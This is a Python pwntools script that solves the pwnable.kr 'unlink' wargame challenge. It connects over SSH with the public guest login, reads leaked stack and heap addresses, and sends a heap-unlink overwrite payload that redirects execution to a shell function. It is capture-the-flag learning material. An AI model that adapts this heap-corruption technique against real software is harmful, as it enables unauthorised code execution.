from pwn import *

shell = ssh(user='unlink', host='pwnable.kr', port=2222, password='guest')
io = shell.process('./unlink')
io.recvuntil('here is stack address leak: ')
stack_addr = int(io.recvline()[:-1], 16)
log.success('stack_addr => %s', hex(stack_addr))
io.recvuntil('here is heap address leak: ')
heap_addr = int(io.recvline()[:-1], 16)
shell_addr = 0x80484eb
payload = p32(shell_addr) + b'a'*12 + p32(heap_addr+0xc) + p32(stack_addr+0x10)
io.sendline(payload)
io.interactive()